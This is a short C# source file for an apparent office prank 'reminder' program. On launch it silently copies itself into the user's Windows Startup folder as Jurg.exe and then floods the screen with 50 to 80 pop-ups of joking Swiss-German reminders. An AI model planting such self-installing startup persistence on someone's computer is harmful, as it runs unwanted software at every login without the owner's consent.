using System;
using System.IO;
using System.Windows.Forms;

namespace Jürg_Reminder
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var rawPathExe = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Jurg.exe" };
            string pathExe = Path.Combine(rawPathExe);

            if (!File.Exists(pathExe))
            {
                File.Copy(Application.ExecutablePath, pathExe);
            }           

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            var r = new Random();
            string[] reminders = new string[] { "ENIS MITARBEITERGESPRÄCH !!!!!!!!!!!!!!!!!!!!!", "RESHARPER (RE#) für ENIS !!11!+1 REEEEE", "ENIS MITARBEITERGESPRÄCH !!!!!!!!!!!!!!!!!!!!!", "RESHARPER (RE#) für ENIS !!11!+1 REEEEE", "ENIS MITARBEITERGESPRÄCH !!!!!!!!!!!!!!!!!!!!!", "RESHARPER (RE#) für ENIS !!11!+1 REEEEE", "ENIS MITARBEITERGESPRÄCH !!!!!!!!!!!!!!!!!!!!!", "RESHARPER (RE#) für ENIS !!11!+1 REEEEE", "ENIS MITARBEITERGESPRÄCH !!!!!!!!!!!!!!!!!!!!!", "RESHARPER (RE#) für ENIS !!11!+1 REEEEE", "SCHULUNG X4FLEET??????????" };
            string[] titles = new string[] { "hoppppp schwiz!", "yallah", "hüüüüüü!!!!", "ToDo: HÜT!!!!!", "dawai dawai", "super, witer so!" };

            for (int i = 0; i < r.Next(50, 80); i++)
            {
                new ReminderForm(r, Screen.PrimaryScreen.Bounds.Size, reminders, titles).Show();
            }

            Application.Run();
        }
    }
}
